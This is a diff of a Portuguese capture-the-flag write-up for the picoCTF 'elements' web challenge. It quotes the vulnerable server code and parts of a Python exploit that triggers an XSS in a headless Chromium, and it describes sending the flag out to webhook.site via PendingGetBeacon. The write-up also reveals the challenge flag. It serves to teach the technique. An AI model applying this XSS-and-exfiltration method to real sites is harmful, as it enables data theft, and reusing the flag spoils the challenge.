@@ -1,6 +1,6 @@
 # WriteUp: elements
 ## Descrição do desafio
-**Author**: ehhthing \
+**Autor**: ehhthing \
 **Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/447?category=1&page=4) \
 **Categoria**: Web Exploitation \
 **Dificuldade**: Difícil \
@@ -13,30 +13,40 @@
 ## Passo a Passo da Solução
 ### 1. Análise do código fonte
 O desafio fornece os arquivos fonte do servidor (`elements.tar.gz`) por trás do website alvo. O principal arquivo a se notar é o `index.mjs`, nele descobrimos o path `/remoteCraft`. Esse path aceita um parameter chamado recipe, que passa pelas verificações:
+
+{% code title="index.mjs" overflow="wrap" lineNumbers="true" %}
+
 ``` javascript
 if (url.pathname === '/remoteCraft') {
-		try {
-			const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
-			assert(typeof xss === 'string');
-			assert(xss.length < 300);
-			assert(recipe instanceof Array);
-			assert(recipe.length < 50);
-			for (const step of recipe) {
-				assert(step instanceof Array);
-				assert(step.length === 2);
-				for (const element of step) {
-					assert(typeof xss === 'string');
-					assert(element.length < 50);
-				}
+	try {
+		const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
+		assert(typeof xss === 'string');
+		assert(xss.length < 300);
+		assert(recipe instanceof Array);
+		assert(recipe.length < 50);
+		for (const step of recipe) {
+			assert(step instanceof Array);
+			assert(step.length === 2);
+			for (const element of step) {
+				assert(typeof xss === 'string');
+				assert(element.length < 50);
 			}
-			visit({ recipe, xss });
-		} catch(e) {
-			console.error(e);
-			return res.writeHead(400).end('invalid recipe!');
 		}
-return res.end('visiting!');
+		visit({ recipe, xss });
+	} catch(e) {
+		console.error(e);
+		return res.writeHead(400).end('invalid recipe!');
+	}
+	return res.end('visiting!');
+}
 ```
+
+{% endcode %}
+
 Reparamos na chamada da função `visit({ recipe, xss})`. Vamos examinar essa função:
+
+{% code title="index.mjs" overflow="wrap" lineNumbers="true" %}
+
 ``` javascript
 async function visit(state) {
 	if (visiting) return;
@@ -78,8 +88,14 @@ async function visit(state) {
 	visiting = false;
 }
 ```
-Podemos ver que essa função cria uma nova instância do chromium rodando dentro do servidor com uma aba aberta na url `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`. A variável state está armazenando tanto os paramêtros recipe e xss quanto a flag do desafio. \ 
+
+{% endcode %}
+
+Podemos ver que essa função cria uma nova instância do chromium rodando dentro do servidor com uma aba aberta na url `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`. A variável state está armazenando tanto os paramêtros recipe e xss quanto a flag do desafio. \
 Agora, se formos examinar o arquivo `index.js`, encontramos a função: 
+
+{% code title="index.js" overflow="wrap" lineNumbers="true" %}
+
 ``` javascript
 const evaluate = (...items) => {
 	const [a, b] = items.sort();
@@ -94,9 +110,15 @@ const evaluate = (...items) => {
 	return null;
 }
 ```
+
+{% endcode %}
+
 Essa função é responsável por executar as receitas descritas no `state.recipe`. Contudo, se o resultado da tarefa for igual a XSS, qualquer código dentro de `state.xss` será executado.
 ### 2. Solucionando o desafio
 A estratégia para solucionar o desafio começa encontrando um array recipe com a sequência correta de receitas que gera um elemento XSS. No código python `exploit.py`, a função `find_sequence` será responsável por encontrar este array:
+
+{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
+
 ``` python
 def find_sequence():
     orig = ['Fire', 'Water', 'Earth', 'Air']
@@ -123,7 +145,13 @@ def find_sequence():
     return res_lst
 sequence = find_sequence()
 ```
+
+{% endcode %}
+
 Agora, precisamos criar uma forma de transferir dados da aplicação aberta no chromium do server para nosso computador. Para receber os dados, utilizaremos o website webhook.site. Para enviá-los do servidor, teremos que injetar algum código javascript pelo paramater xss. O servidor está bloqueando a maioria das formas de se comunicar com outros sites pelo navegador chromium, tal como o `fetch`. Contudo, observamos que foi habilitada a opção `--enable-experimental-web-platform-features`. Desse modo, é possível usar uma função chamada `PendingGetBeacon`: 
+
+{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
+
 ``` python
 parameters = {
     "recipe": sequence, 
@@ -141,6 +169,9 @@ print(f"URL gerada: {url}")
 response = requests.get(url) 
 print(response.text)
 ```
+
+{% endcode %}
+
 Recebemos no webhook: *picoCTF%7Blittle_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a%7D%20btw%20contact%20me%20on%20discord%20with%20ur%20solution%20thanks%20@ehhthing* \
 Decodificando-o obtemos: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} btw contact me on discord with ur solution thanks @ehhthing \
 Logo a flag é: **picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}**
